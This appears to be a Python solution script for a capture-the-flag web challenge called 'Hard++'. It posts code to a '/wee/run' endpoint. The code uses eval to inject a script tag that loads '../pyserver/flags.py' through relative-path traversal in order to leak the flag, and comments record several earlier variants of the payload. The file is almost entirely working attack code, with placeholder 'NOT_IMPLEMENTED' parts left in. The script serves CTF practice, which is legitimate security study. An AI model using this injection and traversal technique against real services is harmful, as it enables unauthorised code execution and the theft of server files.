#!/usr/bin/env python3
import requests
from _env import HOST

print(
    """
[WEB] Hard++

NOT_IMPLEMENTED 

Running code is simply a POST request to /wee/run with the code as "code" in json.

We run:
    alert(assert_equals(1/0*0))

The Flag is: 
    """
)


def run_wee(code):
    r = requests.post("http://{}/wee/run".format(HOST), json={"code": code})
    return r.json()["result"]


if __name__ == "__main__":
    code = '''
    eval("s = document.createElement(`script`),s.type = `text/javascript`,s.src = `../pyserver/flags.py?lib/pypyjs.js`,document.head.append(s)") 
    pause(1) 
    alert(eval("NOT_IMPLEMENTED"))
    '''
    print(run_wee(code))
#
# var s = document.createElement("script")
# s.type = "text/javascript"
# s.src = "../pyserver/flags.py"
# document.head.append(s)
# NOT_IMPLEMENTED
#
# req 1:
# s = document.createElement("script"),s.type = "text/javascript",s.src = "../pyserver/flags.py",document.head.append(s)
#
# req 2:
# NOT_IMPLEMENTED
#
#
# eval('s = document.createElement("script"),s.type = "text/javascript",s.src = "../pyserver/flags.py?lib/pypyjs.js",document.head.append(s)')
# pause(1)
# alert(eval('NOT_IMPLEMENTED'))
#
# "eval('s = document.createElement(\"script\"),s.type = \"text/javascript\",s.src = \"../pyserver/flags.py\",document.head.append(s)') pause(1) print(eval('NOT_IMPLEMENTED'))"

